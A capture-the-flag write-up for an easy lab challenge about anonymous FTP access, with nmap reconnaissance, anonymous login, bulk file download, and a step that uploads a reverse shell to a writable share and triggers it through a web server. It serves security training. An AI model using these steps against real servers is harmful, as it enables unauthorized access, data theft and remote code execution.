# Maq144: Anonymous

Writeup for the **Anonymous** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 144

---

## Overview

An FTP server with anonymous access enabled, exposing writable directories or sensitive files. The name is the hint: log in without credentials and see what the server reveals.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

The nmap default scripts (`ftp-anon`) will detect anonymous FTP access automatically. Verify manually:

```bash
ftp [TARGET_IP]
# Username: anonymous
# Password: (blank or any email)
```

## Exploitation

**Enumerate and download everything:**

```bash
ftp [TARGET_IP]
ftp> ls -la
ftp> cd [DIRECTORY]
ftp> binary
ftp> mget *
```

**If the share is writable, upload a reverse shell:**

```bash
ftp> put shell.php
```

Then trigger it via HTTP if a web server is also running.

**Check for sensitive files:** configuration backups, credential files, SSH keys, or the flag itself.

**Recursive download with wget:**

```bash
wget -r --no-passive ftp://anonymous:@[TARGET_IP]/
```

## Post-Exploitation

If writable FTP overlaps with a web root or cron directory, leverage it for code execution. Check if uploaded scripts are executed by any scheduled task or web server.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Valid Accounts: Default Accounts | T1078.001 |
| Data from Network Shared Drive | T1039 |
| Ingress Tool Transfer | T1105 |

### CWE

- **CWE-287:** Improper Authentication (anonymous access)
- **CWE-276:** Incorrect Default Permissions (writable anonymous share)

---

Anonymous access is a feature that becomes a vulnerability the moment anyone forgets it is enabled. The mask of anonymity protects the attacker, not the server.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
